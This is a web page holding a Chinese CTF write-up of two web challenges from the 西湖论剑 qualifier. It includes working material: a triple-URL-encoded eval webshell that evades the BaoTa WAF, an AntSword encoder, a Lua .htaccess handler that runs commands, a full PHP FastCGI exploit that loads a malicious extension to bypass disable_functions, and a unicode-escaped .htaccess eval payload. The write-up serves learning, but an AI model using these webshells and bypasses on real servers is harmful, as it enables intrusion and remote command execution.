@@ -1,0 +1,996 @@
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width,initial-scale=1.0,minimum-scale=1.0,maximum-scale=1.0,user-scalable=0">
+    <meta name="description" content="进入题目是个上传页面
+
+使用换行符绕过。成功上传php
+
+然后发现。不能直接POST传参。会被宝塔拦截
+之前赵总在WMCTF的那题说过。宝塔不会拦截静态文件(没动态传参)
+然后就一直文件上传。访问。
+可以bypass open_basedi..." />
+    <meta name="keywords" content="CTF" />
+    <link rel="stylesheet" href="https://guokeya.github.io/media/css/bootstrap.min.css">
+    <link rel="stylesheet" href="https://guokeya.github.io/styles/main.css">
+    
+    <link rel="stylesheet" href="//cdn.jsdelivr.net/gh/highlightjs/cdn-release@9.18.1/build/styles/vs2015.min.css">
+    
+    <script src="//cdn.jsdelivr.net/gh/highlightjs/cdn-release@9.18.1/build/highlight.min.js"></script>
+    <script src="https://cdn.jsdelivr.net/gh/850552586/ericamcdn@0.1/js/clipboard.min.js"></script>
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/850552586/ericamcdn@0.1/css/live2d.css">
+    <script src="https://cdn.jsdelivr.net/npm/jquery@3.2.1/dist/jquery.min.js"></script>
+    <!-- 最新版本的 Bootstrap 核心 CSS 文件 -->
+    <link href="https://cdn.bootcdn.net/ajax/libs/font-awesome/5.13.1/css/all.min.css" rel="stylesheet">
+    <!-- 数学公式 -->
+    
+    <title>过客</title>
+    
+    <style>
+        .markdownIt-TOC {
+            padding-left: 2px;
+            width: 100%;
+        }
+
+        .markdownIt-TOC li {
+            padding-left: 2%;
+        }
+    </style>
+    
+</head>
+
+<body>
+    <div id="landlord">
+        <div class="message" style="opacity:0"></div>
+        <canvas id="live2d" width="240" height="250" class="live2d"></canvas>
+    </div>
+    <div id="codeCopyText" style="display: none">代码复制成功了哦</div>
+    <div id="domainname" style="display:none">https://guokeya.github.io</div>
+    <!-- 响应式布局，针对PC端内容显示 -->
+    <div id="content">
+        <div>
+            <div id="bar">
+                <head>
+  <!-- 引入Bootstrap核心样式文件 -->
+  <link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/850552586/ericamcdn@0.1/css/bootstrap.min.css">
+</head>
+<style>
+  @media screen and (max-width:1200px) and (min-width: 768px) {
+    @media (min-width: 768px) {
+      .navbar-nav {
+        float: right;
+        margin: 0;
+      }
+    }
+  }
+  @media screen and (max-width:768px){
+    .mbapspan{
+      padding: 0;
+    }
+  }
+</style>
+
+<body>
+  <nav class="navbar navbar-inverse navbar-fixed-top">
+    <div class="container-fluid">
+      <!-- Brand and toggle get grouped for better mobile display -->
+      <div class="navbar-header">
+        <button type="button" class="navbar-toggle collapsed" data-toggle="collapse" data-target="#barmenu"
+          aria-expanded="false" id="barbutton">
+          <span class="sr-only">Toggle navigation</span>
+          <span class="icon-bar"></span>
+          <span class="icon-bar"></span>
+          <span class="icon-bar"></span>
+        </button>
+        <a class="navbar-brand" href="https://guokeya.github.io">过客&nbsp;&nbsp;|</a>
+        <span class="navbar-brand mbapspan"><i id="mbaplayer" class="fa fa-play-circle-o" aria-hidden="true"
+            style="font-size: 28px;top: 12px;position: absolute;" onclick="aplayerPlay();"></i></span>
+      </div>
+
+      <!-- Collect the nav links, forms, and other content for toggling -->
+      <div class="collapse navbar-collapse" id="barmenu">
+        <ul class="nav navbar-nav">
+          
+          
+          <li>
+            <a href="/">
+              首页
+            </a>
+          </li>
+          
+          
+          
+          <li>
+            <a href="/archives">
+              归档
+            </a>
+          </li>
+          
+          
+          
+          <li>
+            <a href="/post/about">
+              关于
+            </a>
+          </li>
+          
+          
+          
+          <li>
+            <a href="/tags">
+              分类
+            </a>
+          </li>
+          
+          
+          
+          
+          <li><a href="https://guokeya.github.io/friends">友链</a></li>
+
+          
+        </ul>
+      </div><!-- /.navbar-collapse -->
+    </div><!-- /.container-fluid -->
+  </nav>
+
+
+  <!-- 引入jQuery核心js文件 -->
+  <script src="https://cdn.jsdelivr.net/npm/jquery@3.2.1/dist/jquery.min.js"></script>
+  <script>
+  var btstate = false;
+  var bt = $("#barbutton");
+  var bm = $("#barmenu");
+  bt.click(function(){
+    dropdown();
+  })
+  function dropdown(){
+    console.log(btstate);
+    //下拉
+    if(btstate==false){
+      bt.removeClass("collapsed");
+      bt.attr("aria-expanded","true");
+      bm.attr("aria-expanded","true")
+      bm.fadeIn(700);
+      btstate = true;
+    }
+    else{
+      bt.addClass("collapsed");
+      bt.attr("aria-expanded","false");
+      bm.removeClass("in");
+      bm.hide();
+      bm.attr("aria-expanded","false");
+      btstate = false;
+    }
+  }
+  </script> 
+</body>
+            </div>
+            <div class="row">
+                <div class="side"><body>
+    
+
+
+
+    
+    <nav class="navbar navbar-inverse navbar-fixed-top">
+        <div class="container-fluid">
+            <!-- Brand and toggle get grouped for better mobile display -->
+            <div class="navbar-header">
+                <a class="navbar-brand" href="https://guokeya.github.io"
+                    style="font-size:21px">过客&nbsp;&nbsp;|&nbsp;&nbsp;</a>
+                <a class="navbar-brand" href=""
+                    style="font-size:15px;font-family:kaiti">TEST</a>
+            </div>
+
+            <!-- Collect the nav links, forms, and other content for toggling -->
+            <div class="collapse navbar-collapse">
+                
+                <div class="search nav navbar-nav" style="margin-top:8px">
+                    <!-- <input type="text" class="search-input" placeholder="标题搜索(●'◡'●)" /> -->
+                    <input type="text" class="search-input" placeholder="标题搜索 ⚆_⚆ つ♡">
+                    <div class="search-results"></div>
+                </div>
+                
+                <div class="search nav navbar-nav searchtop">
+                <a title="text" onclick="document.getElementById('socialMenu').style.display='block'"><i><img class="social"
+                    src="https://guokeya.github.io/media/images/social.png" alt=""></i></a>
+            </div>
+            <ul class="nav navbar-nav" style="float: right;margin-right:5%">
+                
+                
+                <li>
+                    <a href="/" style="color:white">
+                        首页
+                    </a>
+                </li>
+                
+                
+                
+                <li>
+                    <a href="/archives" style="color:white">
+                        归档
+                    </a>
+                </li>
+                
+                
+                
+                <li>
+                    <a href="/post/about" style="color:white">
+                        关于
+                    </a>
+                </li>
+                
+                
+                
+                <li>
+                    <a href="/tags" style="color:white">
+                        分类
+                    </a>
+                </li>
+                
+                
+                
+                  
+                <li><a href="https://guokeya.github.io/friends" style="color:white">友链</a></li>
+                
+                  <li><img src="https://guokeya.github.io/images/avatar.png?v=1602162296852" alt=""
+                class="menutopavatar"></li>
+            </ul>
+        </div><!-- /.navbar-collapse -->
+        </div><!-- /.container-fluid -->
+    </nav>
+    <div id="socialMenu">
+        <div class="animate">
+            <div class="socialContainer">
+                
+                
+                
+                
+                
+                
+            </div>
+            <div id="qq" style="display:none"></div>
+        </div>
+    </div>
+    <!-- 引入jQuery核心js文件 -->
+    <script src="https://cdn.jsdelivr.net/npm/jquery@3.2.1/dist/jquery.min.js"></script>
+    <script>
+        var social = document.getElementById('socialMenu');
+        // 鼠标点击模型外区域关闭登录框
+        window.onclick = function (event) {
+            if (event.target == social) {
+                social.style.display = "none";
+            }
+        }
+    </script>
+    
+</body>
+<script>
+    //-------------------------------------------------搜索
+    // 获取搜索框、搜索按钮、清空搜索、结果输出对应的元素
+    var searchInput = document.querySelector('.search-input');
+    var searchResults = document.querySelector('.search-results');
+
+    // 申明保存文章的标题、链接、内容的数组变量
+    var searchValue = '',
+        arrItems = [],
+        arrLinks = [],
+        arrTitles = [],
+        arrResults = [],
+        indexItem = [],
+        itemLength = 0;
+    var tmpDiv = document.createElement('div');
+    tmpDiv.className = 'result-item';
+
+    // ajax 的兼容写法
+    var xhr = new XMLHttpRequest() || new ActiveXObject('Microsoft.XMLHTTP');
+    xhr.onreadystatechange = function () {
+        if (xhr.readyState == 4 && xhr.status == 200) {
+            xml = xhr.responseXML;
+            arrItems = xml.getElementsByTagName('entry');
+            itemLength = arrItems.length;
+            // 遍历并保存所有文章对应的标题、链接、内容到对应的数组中
+            // 同时过滤掉 HTML 标签
+            for (i = 0; i < itemLength; i++) {
+                var link = arrItems[i].getElementsByTagName('link')[0];
+                arrLinks[i] = link.getAttribute("href");
+                arrTitles[i] = arrItems[i].getElementsByTagName('title')[0].
+                childNodes[0].nodeValue.replace(/<.*?>/g, '');
+            }
+        }
+    }
+
+    // 开始获取根目录下 feed.xml 文件内的数据
+    xhr.open('get', '/atom.xml', true);
+    xhr.send();
+
+
+
+    // 输入框内容变化后就开始匹配，可以不用点按钮
+    // 经测试，onkeydown, onchange 等方法效果不太理想，
+    // 存在输入延迟等问题，最后发现触发 input 事件最理想，
+    // 并且可以处理中文输入法拼写的变化
+    searchInput.oninput = function () {
+        setTimeout(searchConfirm, 0);
+    }
+    searchInput.onfocus = function () {
+        searchResults.style.display = 'block';
+    }
+
+    function searchConfirm() {
+        if (searchInput.value == '') {
+            searchResults.style.display = 'none';
+        } else if (searchInput.value.search(/^\s+$/) >= 0) {
+            // 检测输入值全是空白的情况
+            searchInit();
+            var itemDiv = tmpDiv.cloneNode(true);
+            itemDiv.innerText = '请输入有效内容...';
+            searchResults.appendChild(itemDiv);
+        } else {
+            // 合法输入值的情况
+            searchInit();
+            searchValue = searchInput.value;
+            // 在标题、内容中查找
+            searchMatching(arrTitles, searchValue);
+        }
+    }
+
+    // 每次搜索完成后的初始化
+    function searchInit() {
+        arrResults = [];
+        indexItem = [];
+        searchResults.innerHTML = '';
+        searchResults.style.display = 'block';
+    }
+
+    function searchMatching(arr1, input) {
+        // 忽略输入大小写
+        input = new RegExp(input, 'i');
+        // 在所有文章标题、内容中匹配查询值
+        for (i = 0; i < itemLength; i++) {
+            if (arr1[i].search(input) !== -1) {
+                var arr = arr1;
+                indexItem.push(i); // 保存匹配值的索引
+                var indexContent = arr[i].search(input);
+                // 此时 input 为 RegExp 格式 /input/i，转换为原 input 字符串长度
+                var l = input.toString().length - 3;
+                var step = 10;
+
+                // 将匹配到内容的地方进行黄色标记，并包括周围一定数量的文本
+                arrResults.push(arr[i].slice(indexContent - step, indexContent));
+            }
+        }
+
+        // 输出总共匹配到的数目
+        var totalDiv = tmpDiv.cloneNode(true);
+        totalDiv.innerHTML = '<b>总匹配：' + indexItem.length + ' 项<hr></b>';
+        searchResults.appendChild(totalDiv);
+
+        // 未匹配到内容的情况
+        if (indexItem.length == 0) {
+            var itemDiv = tmpDiv.cloneNode(true);
+            itemDiv.innerText = '未匹配到内容...';
+            searchResults.appendChild(itemDiv);
+        }
+
+        // 将所有匹配内容进行组合
+        for (i = 0; i < arrResults.length; i++) {
+            var itemDiv = tmpDiv.cloneNode(true);
+            itemDiv.innerHTML = '<b>[' + arrTitles[indexItem[i]] +
+                ']</b><p>' + arrResults[i] + "</p><hr />";
+            itemDiv.setAttribute('onclick', 'changeHref(arrLinks[indexItem[' + i + ']])');
+            searchResults.appendChild(itemDiv);
+        }
+    }
+
+    function changeHref(href) {
+        location.href = href;
+    }
+
+    function showqq() {
+        var qq = document.getElementById("qq").innerHTML;
+        if (qq != '')
+            window.location.href = "tencent://message/?uin=" + qq + "&Site=&Menu=yes";
+        else
+            alert("博主暂未设置QQ联系方式");
+    }
+</script>
+</div>
+                
+            <div class="col-md-2 col-lg-3"></div>
+            <div id="postmain" class="col-xs-12 col-sm-12 col-md-8  col-lg-6 posttop" >
+                <link rel="stylesheet" href="https://guokeya.github.io/media/css/font-awesome.css">
+
+<body>
+    <div class="allcontent" id="postdetail">
+        <div class="postshow" style="padding-bottom: 0;">
+            
+            <div class="postdetailimg" style="width:100%;overflow: hidden;">
+                
+                <img src="" class="postimage">
+                
+            </div>
+            <div class="postinfo-detail">
+                <div class="postdate"><i class="fa fa-calendar"></i>2020-10-08</div>
+            <div class="poststatus postdate"><i class="fa fa-clock-o"></i> 7 min read</div>
+            <div class="posttag">
+                
+                <a href="https://guokeya.github.io/tag/CTF/" class="postlink">
+                    <i class="fa fa-tag"></i> CTF
+                </a>
+                
+            </div>
+        </div>
+        
+        <div id="articlecontent">
+            <div id="texttitle" style="text-align: center">
+                <h2>西湖论剑初赛Web1/5</h2>
+                <!-- id 将作为查询条件 -->
+                <div id="pl" style="display:none">https://guokeya.github.io/post/qKqMPs-ml/</div>
+                <div id="rootaddr" style="display:none">https://guokeya.github.io</div>
+                <span id="hotnum">
+                    <h4><i class="fa fa-eye" aria-hidden="true" style="color: #FF8C00;"></i>&nbsp;&nbsp;热度</i>: <i
+                            class="hotnum">loading...</i></h4>
+                </span>
+            </div>
+            <div class="text ">
+                <p>进入题目是个上传页面<br>
+<img src="https://guokeya.github.io/post-images/1602148521751.png" alt="" loading="lazy"><br>
+使用换行符绕过。成功上传php<br>
+<img src="https://guokeya.github.io/post-images/1602148599097.png" alt="" loading="lazy"><br>
+然后发现。不能直接POST传参。会被宝塔拦截<br>
+之前赵总在WMCTF的那题说过。宝塔不会拦截静态文件(没动态传参)<br>
+然后就一直文件上传。访问。<br>
+可以bypass open_basedir<br>
+<img src="https://guokeya.github.io/post-images/1602149141409.png" alt="" loading="lazy"><br>
+可以看到根目录有/readflag。那么还是嘚想办法执行命令<br>
+这里GS大师傅发现。用URL编码3次。宝塔就不会拦截。可以动态执行命令<br>
+直接传个<code>eval(urlencode(urlencode(urlencode($_POST[1]))));</code>即可<br>
+然后蚁剑写个编码器。同样编码三次</p>
+<pre><code>/**
+ * php::base64编码器
+ * Create at: 2020/10/08 11:13:29
+ */
+
+'use strict';
+
+/*
+* @param  {String} pwd   连接密码
+* @param  {Array}  data  编码器处理前的 payload 数组
+* @return {Array}  data  编码器处理后的 payload 数组
+*/
+
+function forceEncode(s) {
+  return Array.from(s).map(i=&gt;'%'+i.charCodeAt(0).toString(16).padStart(2,'0')).join('')
+}
+
+module.exports = (pwd, data, ext={}) =&gt; {
+  const payload = data['_']
+  data[pwd] = forceEncode(forceEncode(forceEncode(payload)));
+  delete data['_'];
+  console.log(data);
+  return data;
+}
+</code></pre>
+<p>加上UA头就能直接上蚁剑了</p>
+<h1 id="解法1">解法1</h1>
+<p>利用宝塔Apache默认安装的lua模块配合htaccess执行系统命令<br>
+<code>https://xz.aliyun.com/t/6088</code><br>
+这里。写一个.htaccess</p>
+<pre><code>AddHandler lua-script .lua
+</code></pre>
+<p>写一个1.lua (apache官网上复制的HelloWorld。替换了下)</p>
+<pre><code>require &quot;string&quot;
+
+function handle(r)
+    r.content_type = &quot;text/plain&quot;
+    local t = io.popen('/readflag')
+    local a = t:read(&quot;*all&quot;)
+    r:puts(a)
+
+    if r.method == 'GET' then
+        for k, v in pairs( r:parseargs() ) do
+            r:puts( string.format(&quot;%s: %s\n&quot;, k, v) )
+        end
+    else
+        r:puts(&quot;Unsupported HTTP method &quot; .. r.method)
+    end
+end
+</code></pre>
+<p>访问拿到Flag<br>
+<img src="https://guokeya.github.io/post-images/1602149485630.png" alt="" loading="lazy"></p>
+<h1 id="解法2">解法2</h1>
+<p>利用tmp下的php-fpm socket加载扩展。执行命令<br>
+上传1.so。这是一个恶意扩展。相当于Redis的那个so。可以调用恶意函数<br>
+<code>https://github.com/AntSwordProject/ant_php_extension</code>相同PHP版本编译下就行<br>
+上传蚁剑的利用脚本。2.php</p>
+<pre><code>&lt;?php 
+class Client
+{
+    const VERSION_1            = 1;
+    const BEGIN_REQUEST        = 1;
+    const PARAMS               = 4;
+    const STDIN                = 5;
+    const STDOUT               = 6;
+    const STDERR               = 7;
+    const DATA                 = 8;
+    const GET_VALUES           = 9;
+    const GET_VALUES_RESULT    = 10;
+    const UNKNOWN_TYPE         = 11;
+    const RESPONDER            = 1;
+    protected $keepAlive = false;
+    protected $_requests = array();
+    protected $_requestCounter = 0;
+    protected function buildPacket($type, $content, $requestId = 1)
+    {
+        $offset = 0;
+        $totLen = strlen($content);
+        $buf    = '';
+        do {
+            // Packets can be a maximum of 65535 bytes
+            $part = substr($content, $offset, 0xffff - 8);
+            $segLen = strlen($part);
+            $buf .= chr(self::VERSION_1)        /* version */
+                . chr($type)                    /* type */
+                . chr(($requestId &gt;&gt; 8) &amp; 0xFF) /* requestIdB1 */
+                . chr($requestId &amp; 0xFF)        /* requestIdB0 */
+                . chr(($segLen &gt;&gt; 8) &amp; 0xFF)    /* contentLengthB1 */
+                . chr($segLen &amp; 0xFF)           /* contentLengthB0 */
+                . chr(0)                        /* paddingLength */
+                . chr(0)                        /* reserved */
+                . $part;                        /* content */
+            $offset += $segLen;
+        } while ($offset &lt; $totLen);
+        return $buf;
+    }
+    protected function buildNvpair($name, $value)
+    {
+        $nlen = strlen($name);
+        $vlen = strlen($value);
+        if ($nlen &lt; 128) {
+            /* nameLengthB0 */
+            $nvpair = chr($nlen);
+        } else {
+            /* nameLengthB3 &amp; nameLengthB2 &amp; nameLengthB1 &amp; nameLengthB0 */
+            $nvpair = chr(($nlen &gt;&gt; 24) | 0x80) . chr(($nlen &gt;&gt; 16) &amp; 0xFF) . chr(($nlen &gt;&gt; 8) &amp; 0xFF) . chr($nlen &amp; 0xFF);
+        }
+        if ($vlen &lt; 128) {
+            /* valueLengthB0 */
+            $nvpair .= chr($vlen);
+        } else {
+            /* valueLengthB3 &amp; valueLengthB2 &amp; valueLengthB1 &amp; valueLengthB0 */
+            $nvpair .= chr(($vlen &gt;&gt; 24) | 0x80) . chr(($vlen &gt;&gt; 16) &amp; 0xFF) . chr(($vlen &gt;&gt; 8) &amp; 0xFF) . chr($vlen &amp; 0xFF);
+        }
+        /* nameData &amp; valueData */
+        return $nvpair . $name . $value;
+    }
+    protected function readNvpair($data, $length = null)
+    {
+        if ($length === null) {
+            $length = strlen($data);
+        }
+        $array = array();
+        $p = 0;
+        while ($p != $length) {
+            $nlen = ord($data{$p++});
+            if ($nlen &gt;= 128) {
+                $nlen = ($nlen &amp; 0x7F &lt;&lt; 24);
+                $nlen |= (ord($data{$p++}) &lt;&lt; 16);
+                $nlen |= (ord($data{$p++}) &lt;&lt; 8);
+                $nlen |= (ord($data{$p++}));
+            }
+            $vlen = ord($data{$p++});
+            if ($vlen &gt;= 128) {
+                $vlen = ($nlen &amp; 0x7F &lt;&lt; 24);
+                $vlen |= (ord($data{$p++}) &lt;&lt; 16);
+                $vlen |= (ord($data{$p++}) &lt;&lt; 8);
+                $vlen |= (ord($data{$p++}));
+            }
+            $array[substr($data, $p, $nlen)] = substr($data, $p+$nlen, $vlen);
+            $p += ($nlen + $vlen);
+        }
+        return $array;
+    }
+    public function buildAllPacket(array $params, $stdin)
+    {
+        // Ensure new requestID is not already being tracked
+        do {
+            $this-&gt;_requestCounter++;
+            if ($this-&gt;_requestCounter &gt;= 65536 /* or (1 &lt;&lt; 16) */) {
+                $this-&gt;_requestCounter = 1;
+            }
+            $id = $this-&gt;_requestCounter;
+        } while (isset($this-&gt;_requests[$id]));
+        $request = $this-&gt;buildPacket(self::BEGIN_REQUEST, chr(0) . chr(self::RESPONDER) . chr((int) $this-&gt;keepAlive) . str_repeat(chr(0), 5), $id);
+        $paramsRequest = '';
+        foreach ($params as $key =&gt; $value) {
+            $paramsRequest .= $this-&gt;buildNvpair($key, $value, $id);
+        }
+        if ($paramsRequest) {
+            $request .= $this-&gt;buildPacket(self::PARAMS, $paramsRequest, $id);
+        }
+        $request .= $this-&gt;buildPacket(self::PARAMS, '', $id);
+        if ($stdin) {
+            $request .= $this-&gt;buildPacket(self::STDIN, $stdin, $id);
+        }
+        $request .= $this-&gt;buildPacket(self::STDIN, '', $id);
+        return $request;
+    }
+}
+$sock = stream_socket_client(&quot;unix:///tmp/php-cgi-74.sock&quot;, $errno, $errstr);
+$client = new Client();
+$payload_file = &quot;/www/wwwroot/10.20.124.208/sandbox/af1e5s04sho98l744pqcdauk32/upload/s.php&quot;;
+$params = array(
+    'REQUEST_METHOD' =&gt; 'GET',
+    'SCRIPT_FILENAME' =&gt; $payload_file,
+    'PHP_ADMIN_VALUE' =&gt; &quot;extension_dir = /www/wwwroot/10.20.124.208/sandbox/af1e5s04sho98l744pqcdauk32/upload\nextension = 1.so&quot;,
+    //这里$payload_file。是我们调用恶意so执行的php命令。extension_dir是扩展目录extension是扩展名
+);
+$data = $client-&gt;buildAllPacket($params, '');
+fwrite($sock, $data);
+var_dump(fread($sock, 4096));
+?&gt;
+</code></pre>
+<p>上传s.php</p>
+<pre><code>&lt;?php antsystem(&quot;/readflag&quot;); ?&gt;
+</code></pre>
+<p>直接访问即可。<br>
+<img src="https://guokeya.github.io/post-images/1602150403855.png" alt="" loading="lazy"><br>
+exp中最好用绝对路径。不然。。这个沙盒。。目录名有点乱</p>
+<h1 id="web5">Web5</h1>
+<p>题目给出了源码<br>
+<img src="https://guokeya.github.io/post-images/1602150845461.png" alt="" loading="lazy"><br>
+这里首先试了下filename为php。safe faild   然后.htaccess可以写入<br>
+又看到代码中会写入\nxxxxx。有点<code>[XNUCA2019Qualifier]EasyPHP]</code>的意思了。<br>
+写htaccess。然后用<code>#&lt;?php evalxxx?&gt;\</code>去注释掉无用字符。然后自动包含<br>
+而且json_decode。是可以用unicode绕过的黑名单检测的。<br>
+构造payload</p>
+<pre><code>{&quot;content&quot;:&quot;\u0070\u0068\u0070\u005f\u0076\u0061\u006c\u0075\u0065\u0020\u0061\u0075\u0074\u006f\u005f\u0070\u0072\u0065\u0070\u0065\u006e\u0064\u005f\u0066\u0069\u005c\u000a\u006c\u0065\u0020\u0022\u002e\u0068\u0074\u0061\u0063\u0063\u0065\u0073\u0073\u0022\u000a\u0023\u003c\u003f\u0070\u0068\u0070\u0020\u0040\u0065\u0076\u0061\u006c\u0028\u0024\u005f\u0047\u0045\u0054\u005b\u0027\u0063\u006d\u0064\u0027\u005d\u0029\u003b\u0020\u003f\u003e\u005c&quot;}
+</code></pre>
+<p>发现还是faild。然后随便打。。发现无论打什么。。content都会safe faild。<br>
+会不会。是直接检测是否存在content这个键。。<br>
+把这个键也unicode编码下。发现可以了<br>
+<img src="https://guokeya.github.io/post-images/1602151357978.png" alt="" loading="lazy"><br>
+访问index.php就会自动包含.htaccess其中的eval。<br>
+<img src="https://guokeya.github.io/post-images/1602151410721.png" alt="" loading="lazy"></p>
+
+            </div>
+            <hr style="width: 80%;">
+            
+            <div class="sharebtnContainer">
+                <button type="button" class="sharebtn">转载分享</button>
+            </div>
+            <div class="shareContainer">
+                <div class="share" style="height:30px;background: white;">
+                    <a class="qq" href=""><i><img class="shareicon"
+                                src="https://guokeya.github.io/media/images/QQ.png" alt=""></i></a>
+                    <a class="wechat" href=""><i><img class="shareicon"
+                                src="https://guokeya.github.io/media/images/wechat.png" alt=""></i></a>
+                    <a class="weibo" href=""><i><img class="shareicon"
+                                src="https://guokeya.github.io/media/images/weibo.png" alt=""></i></a>
+                    <a class="qzone" href=""><i><img class="shareicon"
+                                src="https://guokeya.github.io/media/images/qzone.png" alt=""></i></a>
+                    <a class="douban" href=""><i><img class="shareicon"
+                                src="https://guokeya.github.io/media/images/douban.png" alt=""></i></a>
+                    <a class="facebook" href=""><i><img class="shareicon"
+                                src="https://guokeya.github.io/media/images/facebook.png" alt=""></i></a>
+                    <a class="twitter" href=""><i><img class="shareicon"
+                                src="https://guokeya.github.io/media/images/twitter.png" alt=""></i></a>
+                </div>
+            </div>
+            
+            
+            <div class="donateContainer">
+                <img src="https://guokeya.github.io/media/images/donate.png" alt="" class="donateImg">
+            </div>
+            <div class="donateContainer">
+                <img src="" alt="" class="donate">
+            </div>
+            
+            <div class="postfooter">
+                <ul class="post-copyright">
+                    <li><strong>文章作者：</strong></li>
+            <li><strong>原文链接：</strong>https://guokeya.github.io/post/qKqMPs-ml/</li>
+            <li><strong>版权声明：</strong>本博客所有文章除特别声明外，均采用<i class="fa fa-fw fa-creative-commons"></i>BY-NC-SA
+                许可协议。转载请注明出处！</li>
+            </ul>
+        </div>
+        <div id="otherpost">
+            
+            
+            <div class="next-post-pc">
+                <div id="npcontainer" onclick="window.location.href= 'https://guokeya.github.io/post/dGx1XF8ak/';return false">
+                    
+                    
+                    <img src="" style="width: 100%;" class="opimg">
+                    
+                        
+                    <h4 class="optitle">CTFSHOW命令执行的一些特殊变量</h4>
+                </div>
+            </div>
+            <div class="next-post">
+                下一篇 <a href="https://guokeya.github.io/post/dGx1XF8ak/">CTFSHOW命令执行的一些特殊变量</a>
+            </div>
+            
+        </div>
+    </div>
+    </div>
+    </div>
+
+</body>
+<script>
+    //文章阅读热度
+    var pl = $("#pl").html();
+    var rootaddr = $("#rootaddr").html();
+    pl = pl.replace(rootaddr, "");
+    $("#hotnum").attr('id', pl);
+</script>
+                <div id="comment" class="comment" style="background: white">
+                    <div class="commentcontainer">
+                        
+                        <p>请到客户端“主题--自定义配置--valine”中填入ID和KEY</p>
+                        
+                    </div>
+                </div>
+            </div>
+            <div class="col-md-2 col-lg-3">
+            </div>
+            <div id="bg">
+            </div>
+        </div>
+        
+        
+        <div class="toc-container">
+            <ul class="markdownIt-TOC">
+<li><a href="#%E8%A7%A3%E6%B3%951">解法1</a></li>
+<li><a href="#%E8%A7%A3%E6%B3%952">解法2</a></li>
+<li><a href="#web5">Web5</a></li>
+</ul>
+
+    </div>
+    </div>
+    </div>
+    <div class="tog">
+        <div class="toggleContainer">
+            <div class="toggle">
+                <i class="fas fa-angle-double-up"></i>
+            </div>
+        </div>
+    </div>
+    <div id="bgchoice" style="display: none"></div>
+    
+    <div id="bgurl" style="display:none"></div>
+    
+    </div>
+</body>
+<script>
+    var img = $("img");
+    for (var i = 0; i < img.length; i++) {
+        if (img.eq(i).attr("class") == undefined) {
+            img.eq(i).attr("class", "lazyload");
+            var imgsrc = img.eq(i).attr("src");
+            img.eq(i).attr("data-original", imgsrc);
+            img.eq(i).attr("src", "");
+            img.eq(i).hide();
+        }
+    }
+</script>
+<script>
+    hljs.initHighlightingOnLoad();
+</script>
+<script>
+    //寻找所有code标签，加复制按钮鸭！(行内代码除外)
+    var codes = document.getElementsByTagName('code');
+    if (codes.length) {
+        for (var i = 0; i < codes.length; i++) {
+            //高度/行高=文本行数
+            // var rowNum=Math.round(codes[i].height()/parseFloat(codes[i].css('line-height')));
+            // console.log("当前有"+rowNum+"行");
+            var code_id = "code_id_" + i;
+            codes[i].setAttribute("id", code_id);
+            var ci = "#" + code_id;
+            var codedot = $(ci);
+            var rowNum = Math.round(codedot.height() / parseFloat(codedot.css('line-height')));
+            if (rowNum <= 1) continue;
+            var btn = document.createElement("button");
+            btn.setAttribute("class", "copybt");
+            btn.setAttribute("data-clipboard-target", "#" + code_id);
+            btn.innerHTML = '复制代码';
+            codes[i].parentNode.insertBefore(btn, codes[i]);
+        }
+    };
+    var cop = new ClipboardJS('.copybt');
+    var codeCopyText = $("#codeCopyText").html();
+    cop.on('success', function (e) {
+        alert(codeCopyText);
+        e.clearSelection();
+    });
+    cop.on('error', function (e) {
+        alert("矮油，复制失败了...手动复制吧勇士！");
+        e.clearSelection();
+    });
+</script>
+
+<script>
+    $(function () {
+        $('.toggleContainer').click(function () {
+            $('html,body').animate({
+                scrollTop: '0px'
+            }, 800);
+        });
+        $(window).scroll(function () {
+            var st = $(window).scrollTop();
+            if (st > 30) {
+                $(".toggleContainer").fadeIn(400);
+            } else {
+                $(".toggleContainer").fadeOut(100);
+            }
+        });
+    });
+</script>
+
+<script>
+    var bgchoice = $('#bgchoice').html();
+    var bg = $('#bg');
+    var bgurl = document.getElementById("bgurl").innerHTML;
+    if (bgchoice == 'default')
+        for (var i = 0; i < 3; i++)
+            bgurl = bgurl.replace("\\", "/");
+    bg.css("background", "url('" + bgurl + "')");
+</script>
+
+
+
+
+<!-- 动态更改上(下)一篇博客图片框长宽 -->
+<script>
+    npcontainer = document.querySelector('#npcontainer');
+    npstyle = window.getComputedStyle(npcontainer, null);
+    npwidth = npstyle.width;
+    npheight = 0.6 * Number(npwidth.replace("px", ""));
+    npheight = npheight.toString() + "px";
+    var op = $(".opimg");
+    op.css("height", npheight);
+</script>
+
+<script src="https://guokeya.github.io/media/share/dist/Share.js"></script>
+
+<script>
+    var avatarSrc = $(".menutopavatar").attr("src");
+    var dp = document.getElementsByClassName("navbar-brand")[1].innerHTML;
+</script>
+
+
+<script>
+    var title = document.getElementById("texttitle").getElementsByTagName("h2");
+    
+    var share = new Share('.share', {
+        title: title[0].innerHTML,
+        initialized: true,
+        //默认获取网站描述
+        description: dp,
+        //网站图片默认获取的是设置的用户头像
+        image: avatarSrc,
+        //激活的分享网站
+        sites: ["weibo", "qq", "wechat", "douban", "qzone", "facebook", "twitter", "google"],
+        //微信分享PC端会生成二维码分享,移动端如果可以唤起微信最好
+        wechatQrcodeTitle: "微信扫一扫：分享", // 微信二维码提示文字
+        wechatQrcodeHelper: '<p>微信里扫一下二维码</p><p>便可将本文分享至朋友圈。</p>',
+        //关闭的网站分享
+        disabled: ['google', 'linkedin'],
+        wechatQrcodePosition: 'bottom'
+    });
+
+    //点击分享按钮展现出分享icons
+    var sharebtnTag = false;
+    $(".sharebtn").click(function () {
+        if(!sharebtnTag)
+        {
+            $(".share").show();
+            sharebtnTag = true;
+        }
+        else
+        {
+            $(".share").hide();
+            sharebtnTag = false;
+        }
+    })
+
+    var donatebtnTag = false;
+    $(".donateImg").click(function () {
+        if(!donatebtnTag)
+        {
+            $(".donate").show();
+            donatebtnTag = true;
+        }
+        else{
+            $(".donate").hide();
+            donatebtnTag = false;
+        }
+    })
+
+    //加载后的事件同步（阅读量、移动端评论等
+    window.onload=function(){
+        getHotnum();
+        var sharepc = $(".share").eq(0).html();
+        $(".share").eq(1).html(sharepc);
+        document.getElementById("veditor").setAttribute("placeholder", jrsc);
+        aplayerbtnInit();
+    }
+</script>
+
+
+<script>
+    jQuery(document).ready(function ($) {
+        function lazyload() {
+            var oLazyload = $("img.lazyload"),
+                fLazyload = function (hLazyload) {
+                    var nLazyload = $(window).height() + $(document).scrollTop();
+                    oLazyload.each(function () {
+                        $(this).offset().top < nLazyload && ($(this).trigger("appear"), oLazyload =
+                            oLazyload.not(this));
